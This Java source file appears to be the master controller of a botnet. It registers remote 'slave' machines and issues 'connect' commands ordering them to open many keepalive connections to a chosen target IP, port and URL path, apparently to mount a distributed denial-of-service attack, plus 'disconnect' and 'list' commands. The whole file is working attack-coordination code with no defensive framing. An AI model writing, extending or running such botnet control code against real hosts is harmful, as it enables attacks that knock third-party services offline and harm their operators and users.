import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.Scanner;

public class MasterBot {
	public static List<Slave> slaves = new ArrayList<>();

	public static class Slave {
		private final DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
		
		private final String hostname; 
		private final String ip;
		private final int port;
		private final Date date;
		private boolean isBusy;
		private String targetIp;
		private int targetPort;
		
		public Slave(String hostname, String ip, int port) {
			this.hostname = hostname;
			this.ip = ip;
			this.port = port;
			this.date = new Date();
			this.isBusy = false;
			this.targetIp = null;
			this.targetPort = -1;
		}
		
		public String getHostname() {
			return this.hostname;
		}
		
		public String getIp() {
			return this.ip;
		}
		
		public int getPort() {
			return this.port;
		}
		
		public Date getRegistrationDate() {
			return (Date) this.date.clone();
		}
		
		public void setBusy(boolean busy) {
			this.isBusy = busy;
		}
		
		public boolean isBusy() {
			return this.isBusy;
		}
		
		public String getTargetIp() {
			return this.targetIp;
		}
		
		public void setTargetIp(String ip) {
			this.targetIp = ip;
		}
		
		public int getTargetPort() {
			return this.targetPort;
		}
		
		public void setTargetPort(int port) {
			this.targetPort = port;
		}
		
		public void resetTarget() {
			this.isBusy = false;
			this.targetIp = null;
			this.targetPort = -1;
		}
		
		@Override
		public String toString() {
			return String.format("%s\t%s\t%d\t%s", this.hostname, this.ip, this.port, formatter.format(this.date) );
		}
	}

	public static class CommandRunnable implements Runnable {
		@Override
		public void run() {
			Scanner scanner = null;
			String slaveIp;
			int targetPort;
			String targetIp;
			
			while (true) {
				// listen for user commands
				System.out.print("> ");
				scanner = new Scanner(System.in);
				String cmdStr = scanner.nextLine();
				String[] cmds = cmdStr.split(" ");
				assert cmds.length > 0;

				switch (cmds[0]) {
				case "list":
					for (Slave slave : slaves) {
						System.out.println(slave);
					}
					break;
				case "disconnect":
					assert cmds.length == 4 || cmds.length == 3;
					// Parse arguments.
					slaveIp = cmds[1];
					targetIp = cmds[2];
					targetPort = (cmds.length == 3) ? -1: Integer.parseInt(cmds[3]);
					
					// loop through all the slaves connected to the targetIp
					for (Slave slave : slaves) {
						// This slave is not connected to anything.
						if (!slave.isBusy()) {
							continue;
						}
						
						if (slave.getTargetIp().equals(targetIp) && // Slave is connected to the target with that ip.
							(targetPort == -1 || slave.getTargetPort() == targetPort) && // slave is connected to that port.
							(slaveIp.equals("all") || slave.getIp().equals(slaveIp))) { // slave has that ip.
							Socket socket = null;
							try {
								socket = new Socket(slave.getIp(), slave.getPort());
								PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
								writer.println("disconnect");
							} catch (IOException e){
								System.out.println("Failed to connect to the slave with IP:" + slave.getIp());
								System.exit(-1);
							} finally {
								if (socket != null) {
									try {
										socket.close();
									} catch (IOException e) {
										System.exit(-1);
									}
								}
							}
							slave.resetTarget();
						}
					}
					break;

				case "connect":
					assert cmds.length > 3;
					slaveIp = cmds[1];
					targetIp = cmds[2];
					targetPort = Integer.parseInt(cmds[3]);
					boolean keepalive = false;
					int connections = 1;
					String path = "";
					for (int i = 4; i < cmds.length; i++) {
						if (cmds[i].equals("keepalive")) {
							keepalive = true;
						} else if (cmds[i].startsWith("url=")) {
							path = cmds[i].substring("url=".length());
	//						path += createRandomString(10);
						} else {
							connections = Integer.parseInt(cmds[i]);
						}
					}
					

					for (Slave slave : slaves) {
						if (slaveIp.equals("all") || slave.getIp().equals(slaveIp)) {
							// Tell the slave to connect to the target.
							Socket socket = null;
							try {
								socket = new Socket(slave.getIp(), slave.getPort());
								PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
								writer.println(String.format("connect %s %d conn=%d keepalive=%d path=%s",
										targetIp, targetPort, connections, (keepalive ? 1 : 0), path));
								slave.setBusy(true);
								slave.setTargetIp(targetIp);
								slave.setTargetPort(targetPort);
							} catch (IOException e){
								System.exit(-1);
							} finally {
								if (socket != null) {
									try {
										socket.close();
									} catch (IOException e) {
										System.exit(-1);
									}
								}
							}
						}
					}
					break;

				case "quit":
					System.out.println("Quitting the program...");
					scanner.close();
					return;
				}
			}
		}

//		private String createRandomString(int maxLen) {
//			int len = new Random().nextInt(maxLen) + 1;
//			StringBuffer str = new StringBuffer();
//			for (int j = 0; j < len; j++) {
//				str.append( new String(Character.toChars(new Random().nextInt(94) + 33)));
//			}
//			return str.toString();
//		}
	}

	public static void main(String[] args) {
		(new Thread(new CommandRunnable())).start();

		int serverPort = 0;
		for (int i = 0; i < args.length; i++) {
			if (args[i].equals("-p")) {
				serverPort = Integer.parseInt(args[i + 1]);
			}
		}

		ServerSocket server = null;

		try {
			server = new ServerSocket(serverPort, 10000);
			System.out.printf("Server started at %s:%d\n", InetAddress.getLocalHost().getHostAddress(), serverPort);
			while (true) {
				Socket socket = server.accept();
				BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
				int port = Integer.parseInt(in.readLine().trim());

				InetSocketAddress inetSocket = ((InetSocketAddress) socket.getRemoteSocketAddress());

				Slave slave = new Slave(inetSocket.getHostName(), inetSocket.getAddress().getHostAddress(), port);
				slaves.add(slave);
			}
		} catch (IOException e) {
			System.out.println("Server was unable to accept new connection");
			System.exit(-1);
		} finally {
			if (server != null) {
				try {
					server.close();
				} catch (IOException e) {
					System.exit(-1);
				}
			}
		}

		System.out.println("Server stopped.");
	}
}
